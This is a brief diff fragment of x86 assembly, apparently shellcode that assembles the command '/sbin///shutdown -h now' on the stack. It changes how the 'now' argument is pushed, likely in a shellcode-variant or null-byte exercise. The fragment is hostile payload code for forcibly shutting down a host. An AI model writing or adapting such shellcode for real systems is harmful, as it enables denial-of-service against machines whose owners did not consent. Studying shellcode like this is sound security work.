@@ -21,9 +21,9 @@ _start:
     push word 0x682d                    ; -h option
     mov    edi,esp                      ; save stack pointer to edi
     push   eax                          ; push null
-    push   0x6e                         ; "n" character
-    push   0x6f                         ; "o" character
-    push   0x77                         ; "w" character
+    push byte 0x6e                      ; "n" character
+    mov byte [esp+1], 0x6f              ; "o" character
+    mov byte [esp+2], 0x77              ; "w" character
     mov    edi,esp                      ; save stack pointer to edi
     push   eax                          ; push null
     push   0x6e776f64                   ; these four push instructions correspond to /sbin///shutdown
